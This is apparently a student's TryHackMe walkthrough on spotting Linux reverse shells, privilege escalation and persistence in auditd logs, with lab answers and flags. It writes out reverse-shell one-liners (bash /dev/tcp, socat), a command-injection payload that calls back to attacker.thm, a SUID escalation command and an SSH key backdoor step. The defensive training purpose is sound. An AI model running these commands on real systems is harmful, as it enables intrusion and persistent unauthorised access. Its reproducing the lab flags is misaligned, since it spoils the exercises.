# Linux Threat Detection 3 – TryHackMe Walkthrough

<div align="center">

![TryHackMe](https://img.shields.io/badge/TryHackMe-Linux%20Threat%20Detection%203-red?style=for-the-badge&logo=tryhackme)

![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)

![Category](https://img.shields.io/badge/Category-Linux%20Security%20Monitoring-blue?style=for-the-badge)

</div>

---

## 📖 Room Overview

In this room, I explored the later stages of targeted Linux attacks and learned how a SOC analyst can spot each stage inside system logs using `auditd`.

Unlike the noisy, automated attacks (such as cryptominers), this room focuses on the quiet, hands-on-keyboard intrusions carried out by real threat actors who picked their victim on purpose.

This room introduced:

- Reverse shells and how they're detected

- Privilege escalation and its surrounding indicators

- Startup persistence (cron jobs and systemd services)

- Account persistence (new users and backdoored SSH keys)

- Reading and pivoting through `auditd` logs

- Real-world APT and ransomware context

---

# 🛠️ Task 1: Introduction

This task set the stage for the room and explained why manual, targeted Linux attacks deserve just as much attention as advanced Windows breaches.

## Key Takeaway for my GitHub

I learned that not every Linux attack is a simple SSH brute-force or background cryptominer. Some are carefully planned, targeted campaigns, and detecting them means understanding the full attack chain — from reverse shells all the way to persistence — and knowing how each step looks in the logs.

To work through the labs, some tasks require root access on the VM, which is done with `sudo su`.

---

## Questions & Answers

### Let's go!

Answer: Let's go!

---

# 🔌 Task 2: Reverse Shells

When an attacker gets in through SSH, they enjoy a clean, interactive terminal. But when they break in through an exploit or a web vulnerability, they often land in a broken, limited shell — buggy output, timeouts, rate limits, and network restrictions.

To fix this, they establish a **reverse shell**: they force the victim to connect back out to them, giving a fully functional session to continue the attack.

---

## Common Reverse Shell Methods

| Command on the victim | Explanation |

|---|---|

| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Forces the victim to connect out and hand over a bash shell |

| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,...` | Same idea using socat |

| `python3 -c '...pty.spawn("bash")'` | Same idea using Python |

---

## Detecting Reverse Shells

SOC teams treat reverse shells as critical alerts — they mean a human attacker is already inside. The detection trick is to find the suspicious process and walk **up** the process tree to its origin, then **down** to see what the attacker did next.

```bash

ausearch -i -x socat        # find the suspicious socat command

ausearch -i --pid 27806     # move up the tree to find the parent

ausearch -i --pid 27796     # keep going until you reach the source (TryPingMe)

ausearch -i --ppid 27808 | grep proctitle   # list everything the shell ran

```

---

## Questions & Answers

### Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?

Answer: svctrypingme

---

### Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?

Answer: THM{revshells_practitioner!}

---

### Looking at the exported auditd logs, which IP spawned a similar reverse shell via the TryPingMe app?

Answer: 10.14.105.255

---

# ⬆️ Task 3: Privilege Escalation

Getting in isn't the same as owning the box. Many web exploits drop the attacker in as a low-privilege service user, sometimes locked to a single folder. Their next move is **privilege escalation** to reach root.

---

## Common Escalation Paths

| What they discover | What they try |

|---|---|

| An old, unpatched Ubuntu 16.04 (`uname -a`) | Run an exploit like PwnKit |

| An `env` binary with the SUID bit set | Abuse it: `/bin/env /bin/bash -p` |

| An unprotected `ssh-backup-key` in `/etc/ssh` | Log in with it: `ssh root@127.0.0.1 -i ssh-backup-key` |

---

## Detecting Privilege Escalation

Because there are hundreds of SUID misconfigurations and thousands of CVEs, chasing each exploit individually is hopeless. The smarter approach is to watch the **surrounding behavior**: a spike of discovery commands, a download into `/tmp`, and data exfil right after.

The cleanest confirmation is to compare the effective user **before and after**. If the same process chain suddenly runs a child as root, escalation succeeded.

```bash

ausearch -i -x pwnkit        # launched by serviceuser (check the uid field)

ausearch -i --ppid 24304     # this spawned a root shell (uid=root)

ausearch -i --ppid 24310     # attacker now continuing as root

```

---

## Questions & Answers

### Which command line was used to look for the "pass" keyword in files?

Answer: grep -iR pass .

---

### Which command line was used to escalate privileges to root?

Answer: su root

---

### Looking at the detected .env file, what was the root password?

Answer: nGql1pQkGa

---

# 🔁 Task 4: Startup Persistence

Linux servers can run for years without a reboot, so some attackers skip persistence entirely. But the serious ones usually plant a backdoor or two for long-term access. This task covers the two most common startup-persistence tricks.

---

## Cron Persistence

Cron jobs are the Linux equivalent of scheduled tasks — the simplest and most popular persistence method. Real examples include **APT29** adding a `@reboot` line to `/var/spool/cron/<user>` for their GoldMax malware, and the **Rocke** cryptominer installing itself as `/etc/cron.d/root` with a `*/10` schedule so it re-downloads itself every 10 minutes.

---

## Systemd Persistence

Systemd services run the most critical parts of the system. With root, an attacker can create their own service too. The **Sandworm** group created a fake `cloud-online.service` — complete with an innocent description — to launch their GOGETTER malware on reboot.

---

## Detecting Persistence

Both cron jobs and systemd services are just text files, so they can be monitored with `auditd`.

```bash

ausearch -i -f /etc/systemd   # watch for changes under /etc/systemd

ausearch -i -x crontab        # watch for execution of the crontab command

```

Key locations to watch: `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/lib/systemd/system/*`, and `/etc/systemd/system/*`.

---

## Questions & Answers

### What flag did you get after running the malware persisting as a service?

Answer: THM{hidden_penguin!}

---

### What flag did you get after running the malware persisting as a cron job?

Answer: THM{ressurect_on_reboot!}

---

# 👤 Task 5: Account Persistence

The previous task was about surviving a reboot. This one is about keeping **access** — maybe the attacker wants to return in a month without leaving any malware behind. How they do it depends on how they got in.

---

## New User Account

If SSH is exposed, attackers may create a new user, add it to a privileged group like `sudo`, and use it for future logins. This is easy to detect through the auth logs.

```bash

cat /var/log/auth.log | grep -E 'useradd|usermod'

# useradd ... new user: name=support ...

# usermod ... add 'support' to group 'sudo'

```

---

## Backdoored SSH Keys

Another method is dropping their own public key into a user's `~/.ssh/authorized_keys`. This blends in with legitimate keys, so it's hard to spot by eye.

Important detection note: process-based detection is unreliable here, because `echo "key" >> authorized_keys` uses a shell builtin and only logs as `bash`. The right move is to **monitor the file itself**.

```bash

ausearch -i -f /.ssh/authorized_keys

```

---

## Application Persistence (Heads-Up)

There's also app-level persistence, such as a web shell added to a compromised WordPress admin panel. It lives in the application layer, so `auditd` often never sees it. If malware keeps reappearing after you've cleaned every persistence method, a public-facing app may be the real source.

---

## Questions & Answers

### Which user was created and added to the sudo group?

Answer: koichi

---

### Which file was changed to allow SSH key persistence?

Answer: /root/.ssh/authorized_keys

---

# 🎯 Task 6: Targeted Attacks and Recap

Earlier rooms covered "hack and forget" attacks — automated and indiscriminate. This room is about the opposite: deliberate, targeted campaigns aimed at specific companies or governments.

---

## Why Linux Matters

### Entry Point

Linux boxes are often firewalls, web servers, and mail servers. Even in a 99% Windows organization, one compromised Linux server can open the door to the entire network.

### Espionage

Linux systems often hold sensitive data or sit in mission-critical networks, making them favorite targets of state-sponsored groups. Kimsuky APT, for example, used the same systemd persistence trick from Task 4.

### Ransomware

Linux ransomware is on the rise, with hypervisors as a prime target. Hundreds of Windows VMs may sit on just a few Linux hypervisors — compromise those, and every VM is at risk.

---

## Questions & Answers

### Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)

Answer: Yea

---

### Should you learn Linux threats even if working with Windows? (Yea/Nay)

Answer: Yea

---

# 🎓 Task 7: Conclusion

Completing this room gave me a solid understanding of the later, more targeted stages of Linux attacks — how adversaries overcome access limits, how they dig in for long-term persistence, and what they're ultimately after.

Many SOC teams skip Linux monitoring, and now I understand why that's a dangerous blind spot. With the `auditd` skills from this series, a full attack chain can be traced either in a SIEM or directly on the host.

---

## Skills Learned

- Reverse shell detection and process-tree pivoting

- Privilege escalation indicators

- Cron and systemd persistence detection

- Account persistence (new users and SSH key backdoors)

- Reading and following `auditd` logs

- Mapping activity to the MITRE ATT&CK matrix

---

## Final Reflection

> Linux systems can be complex, but they are also critical assets to protect. Learning how each stage of an attack looks in the logs is what turns raw `auditd` output into a clear, traceable story of a breach.

---

## Questions & Answers

### Complete the room!

Answer: Complete the room!

---

# 🧰 Tools Used

- auditd / ausearch

- TryHackMe AttackBox

- Linux command line (Bash)

- /var/log/auth.log analysis

---

# 👨‍💻 Author

Sanjish K C  

MS Cybersecurity Candidate at Webster University | Network Analysis | Nmap | Wireshark | Linux | Former Computer Science Instructor Transitioning into Cybersecurity